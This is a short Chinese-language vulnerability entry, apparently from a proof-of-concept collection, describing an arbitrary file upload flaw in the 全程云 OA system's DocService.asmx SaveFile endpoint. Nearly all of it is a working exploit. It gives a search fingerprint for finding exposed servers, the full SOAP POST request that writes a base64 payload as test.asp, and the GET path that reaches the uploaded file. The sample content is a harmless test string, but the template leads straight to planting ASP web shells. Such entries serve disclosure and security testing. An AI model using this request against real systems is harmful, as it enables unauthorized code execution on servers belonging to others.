# 全程云DocumentDocService.asmx接口存在任意文件上传漏洞

- **系统**：全程云DocumentDocService.asmx接口　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="UserLoginFaster"`
- **请求**：`POST /OA/Document/DocService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: 395`　`SOAPAction: "http://tempuri.org/SaveFile"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SaveFile xmlns="http://tempuri.org/">
<bytes>dGVzdDEyMzQ1Ng==</bytes>
<filename>test.asp</filename>
</SaveFile>
</soap:Body>
</soap:Envelope>
上传定位：GET /oa/Upfiles/temp/test.asp HTTP/1.1
```
- **预期**：200　|　—